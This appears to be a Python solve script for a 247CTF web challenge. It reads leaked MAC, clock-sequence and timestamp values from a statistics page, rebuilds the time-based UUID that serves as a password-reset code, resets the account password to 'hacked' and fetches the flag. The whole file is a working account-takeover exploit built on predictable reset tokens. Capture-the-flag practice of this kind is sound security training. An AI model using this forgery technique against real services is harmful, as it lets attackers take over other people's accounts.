import requests
import re
from uuid import UUID
from datetime import datetime, timezone

url = "https://a9cc1d8ea2f23866.247ctf.com/"
s = requests.Session()

# leak uuid components
def leak():
    res = requests.get(f'{url}/statistics')

    mac = re.findall(r'HWaddr(.+)', res.text)[0].strip()
    clock_seq = int(re.findall(r'clock_sequence:(.+)', res.text)[0].strip())
    last_reset = re.findall(r'last_reset:(.+)', res.text)[0].strip()

    return int(mac.replace(":", ""), 16), clock_seq, last_reset

# reset uuid
res = s.get(f'{url}/update_password')

# recover uuid
def get_code(node, clock_seq, last_reset_str):
    UUID_EPOCH_OFFSET = 12219292800
    
    date_part, frac_part = last_reset_str.split(".")
    frac_part = frac_part.strip().ljust(9, "0")
    nanoseconds = int(frac_part[:9])

    dt = datetime.strptime(date_part, "%Y-%m-%d %H:%M:%S")
    dt = dt.replace(tzinfo=timezone.utc)
    unix_seconds = int(dt.timestamp())

    base_ns = (unix_seconds * 10**9) + nanoseconds

    uuid_ticks = (base_ns // 100) + (UUID_EPOCH_OFFSET * 10**7)

    time_low = uuid_ticks & 0xffffffff
    time_mid = (uuid_ticks >> 32) & 0xffff
    time_hi_version = (uuid_ticks >> 48) & 0x0fff
    time_hi_version |= (1 << 12)

    clock_seq_low = clock_seq & 0xff
    clock_seq_hi_variant = (clock_seq >> 8) & 0x3f
    clock_seq_hi_variant |= 0x80

    return UUID(fields=(
        time_low,
        time_mid,
        time_hi_version,
        clock_seq_hi_variant,
        clock_seq_low,
        node
    ))

node, clock_seq, last_reset= leak()

uuid_guess = get_code(node, clock_seq, last_reset)
print("> UUID:", uuid_guess)

pw = 'hacked'

res = s.get(f'{url}/update_password', params={
    'reset_code': uuid_guess,
    'password': pw
})

if "reset" in res.text.lower():
    print("> Password reset")

res = s.get(f'{url}/get_flag', params={
    'password': pw
})

flag = re.findall(r'(247CTF{.+})', res.text)[0]
print("Flag:", flag)